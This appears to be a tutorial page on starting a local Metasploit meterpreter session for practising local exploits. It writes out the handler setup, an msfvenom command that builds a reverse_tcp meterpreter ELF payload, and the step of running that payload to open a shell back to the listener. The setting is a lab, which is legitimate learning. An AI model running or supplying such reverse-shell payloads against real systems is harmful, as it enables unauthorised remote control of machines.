# Setting up a local session

As I said in the [intro][./intro.md], metasploit is designed to run exploits
over a network.  That can make it annoying if you're trying to do stuff locally.
Without doing some initial work to set up a "meterpreter session", you're very
likely to get the error:

```
[-] Exploit failed: The following options failed to validate: SESSION.
[*] Exploit completed, but no session was created.
```

The easiest way to handle this is to manually kick off a "meterpreter" process
that metasploit can interact with/over.  This is essentially like tricking
metasploit into thinking it has gained access to a machine, and now it can
attempt to run exploits locally through the meterpreter shell.

## Step-by-Step

1) In window (1), start up metasploit and have it listen for a connection

````
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST 172.17.0.4
set LPORT 8888
set ExitOnSession false
exploit -j
```

2) In window (2), use msfvenom to download the meterpreter payload as a binary

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=172.17.0.4 LPORT=8888 -f elf X > payload.elf
```

3) In window (2), run the downloaded binary to establish a connection with metasploit

```
./payload.elf
```

4) In window (1), check that a connection was made

The command `sessions -l` should yield:

```
Active sessions
===============

  Id  Name           Type   Information          Connection
  --  ----           ----   -----------          ----------
   3  meterpreter  x86/linux  uid=0  172.17.0.4:8888 -> 172.17.0.4:50958 (172.17.0.4)
```

5) Continue along your merry way by, for example, attempting to exploit a local
binary
